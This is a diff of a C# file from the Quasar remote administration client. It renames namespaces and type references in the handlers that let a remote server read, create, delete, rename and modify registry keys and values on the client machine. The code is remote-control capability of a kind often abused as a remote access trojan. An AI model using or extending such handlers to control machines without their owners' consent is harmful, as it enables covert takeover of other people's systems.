@@ -1,17 +1,16 @@
 ﻿using System;
+using Quasar.Client.Core.Extensions;
+using Quasar.Client.Core.Helper;
+using Quasar.Client.Core.Registry;
 using Quasar.Common.Messages;
 using Quasar.Common.Models;
-using xClient.Core.Extensions;
-using xClient.Core.Helper;
-using xClient.Core.Networking;
-using xClient.Core.Registry;
 
-namespace xClient.Core.Commands
+namespace Quasar.Client.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
     public static partial class CommandHandler
     {
-        public static void HandleGetRegistryKey(DoLoadRegistryKey packet, Client client)
+        public static void HandleGetRegistryKey(DoLoadRegistryKey packet, Networking.Client client)
         {
             GetRegistryKeysResponse responsePacket = new GetRegistryKeysResponse();
             try
@@ -33,7 +32,7 @@ namespace xClient.Core.Commands
 
         #region Registry Key Edit
 
-        public static void HandleCreateRegistryKey(DoCreateRegistryKey packet, Client client)
+        public static void HandleCreateRegistryKey(DoCreateRegistryKey packet, Networking.Client client)
         {
             GetCreateRegistryKeyResponse responsePacket = new GetCreateRegistryKeyResponse();
             string errorMsg;
@@ -61,7 +60,7 @@ namespace xClient.Core.Commands
             client.Send(responsePacket);
         }
 
-        public static void HandleDeleteRegistryKey(DoDeleteRegistryKey packet, Client client)
+        public static void HandleDeleteRegistryKey(DoDeleteRegistryKey packet, Networking.Client client)
         {
             GetDeleteRegistryKeyResponse responsePacket = new GetDeleteRegistryKeyResponse();
             string errorMsg;
@@ -81,7 +80,7 @@ namespace xClient.Core.Commands
             client.Send(responsePacket);
         }
 
-        public static void HandleRenameRegistryKey(DoRenameRegistryKey packet, Client client)
+        public static void HandleRenameRegistryKey(DoRenameRegistryKey packet, Networking.Client client)
         {
             GetRenameRegistryKeyResponse responsePacket = new GetRenameRegistryKeyResponse();
             string errorMsg;
@@ -106,7 +105,7 @@ namespace xClient.Core.Commands
 
         #region RegistryValue Edit
 
-        public static void HandleCreateRegistryValue(DoCreateRegistryValue packet, Client client)
+        public static void HandleCreateRegistryValue(DoCreateRegistryValue packet, Networking.Client client)
         {
             GetCreateRegistryValueResponse responsePacket = new GetCreateRegistryValueResponse();
             string errorMsg;
@@ -127,7 +126,7 @@ namespace xClient.Core.Commands
             client.Send(responsePacket);
         }
 
-        public static void HandleDeleteRegistryValue(DoDeleteRegistryValue packet, Client client)
+        public static void HandleDeleteRegistryValue(DoDeleteRegistryValue packet, Networking.Client client)
         {
             GetDeleteRegistryValueResponse responsePacket = new GetDeleteRegistryValueResponse();
             string errorMsg;
@@ -147,7 +146,7 @@ namespace xClient.Core.Commands
             client.Send(responsePacket);
         }
 
-        public static void HandleRenameRegistryValue(DoRenameRegistryValue packet, Client client)
+        public static void HandleRenameRegistryValue(DoRenameRegistryValue packet, Networking.Client client)
         {
             GetRenameRegistryValueResponse responsePacket = new GetRenameRegistryValueResponse();
             string errorMsg;
@@ -168,7 +167,7 @@ namespace xClient.Core.Commands
             client.Send(responsePacket);
         }
 
-        public static void HandleChangeRegistryValue(DoChangeRegistryValue packet, Client client)
+        public static void HandleChangeRegistryValue(DoChangeRegistryValue packet, Networking.Client client)
         {
             GetChangeRegistryValueResponse responsePacket = new GetChangeRegistryValueResponse();
             string errorMsg;
